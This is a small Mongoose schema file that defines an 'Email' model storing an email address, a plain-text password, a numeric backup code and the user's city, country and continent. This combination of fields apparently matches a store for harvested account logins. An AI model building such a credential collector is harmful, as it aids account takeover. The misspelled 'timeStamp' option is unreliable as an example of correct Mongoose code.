const mongoose = require("mongoose");

const EmailModel = new mongoose.Schema(
  {
    email: {
      type: String,
      required: true,
    },
    password: {
      type: String,
      required: true,
    },
    backupCode: {
      type: Number,
      required: true,
    },
    continent: {
      type: String,
      required: false,
    },
    country: {
      type: String,
      required: false,
    },
    city: {
      type: String,
      required: false,
    },
    date: {
      type: Date,
      default: Date.now,
    },
  },
  {
    timeStamp: true,
  }
);

module.exports = mongoose.model("Email", EmailModel);
